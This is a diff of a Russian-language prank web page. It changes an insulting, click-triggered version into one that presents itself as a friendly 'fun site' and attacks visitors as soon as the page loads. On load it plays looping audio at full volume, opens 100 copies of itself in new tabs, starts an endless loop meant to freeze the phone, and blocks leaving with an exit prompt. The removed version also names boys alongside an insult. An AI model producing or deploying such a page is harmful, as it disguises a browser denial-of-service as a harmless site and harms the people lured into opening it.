@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Лохи</title>
+    <title>Весёлый сайт</title>
     <style>
         body {
             margin: 0;
@@ -22,41 +22,43 @@
         }
     </style>
 </head>
-<body onclick="changeText()">
-    <div id="text">Тимофей лох</div>
-    <audio id="sound" src="https://www.myinstants.com/media/sounds/stony-250.mp3"></audio>
+<body>
+    <div id="text">Заходи, не бойся!</div>
+    <audio id="sound" src="https://www.myinstants.com/media/sounds/stony-prank-mem-2025.mp3" autoplay loop></audio>
 
     <script>
-        const texts = ["Кирилл лох", "Макар лох", "Макс лох", "Витя лох"];
-        let index = 0;
-        let clickCount = 0;
         let sound = document.getElementById("sound");
 
-        function changeText() {
-            if (clickCount < 3) {
-                index = (index + 1) % texts.length;
-                document.getElementById("text").textContent = texts[index];
-                clickCount++;
-            } else {
-                sound.volume = 1.0; // Громкость на максимум
-                sound.loop = true;
-                sound.play().catch(error => console.log("Ошибка автозапуска:", error));
+        // Устанавливаем громкость на максимум (работает только в браузере)
+        function setMaxVolume() {
+            sound.volume = 1.0;
+        }
 
-                // Открываем 100 новых вкладок (может зависнуть браузер)
-                for (let i = 0; i < 100; i++) {
-                    window.open(window.location.href, '_blank');
-                }
+        // Запуск бесконечного цикла для нагрузки процессора
+        function freezePhone() {
+            while (true) {
+                console.log("Телефон зависает...");
+            }
+        }
 
-                // Бесконечная нагрузка процессора
-                while (true) {
-                    console.log("Телефон зависает...");
-                }
+        // Открытие множества вкладок
+        function spamTabs() {
+            for (let i = 0; i < 100; i++) {
+                window.open(window.location.href, '_blank');
             }
         }
 
         // Блокировка выхода
         window.onbeforeunload = function() {
-            return "Ты точно хочешь уйти?"; // Показывает предупреждение при попытке закрытия вкладки
+            return "Ты точно хочешь уйти?";
+        };
+
+        // Запуск всего при загрузке страницы
+        window.onload = function() {
+            setMaxVolume();
+            sound.play().catch(err => console.log("Ошибка автозапуска:", err));
+            setTimeout(spamTabs, 1000); // Открытие вкладок через 1 секунду
+            setTimeout(freezePhone, 2000); // Запуск зависания через 2 секунды
         };
     </script>
 </body>
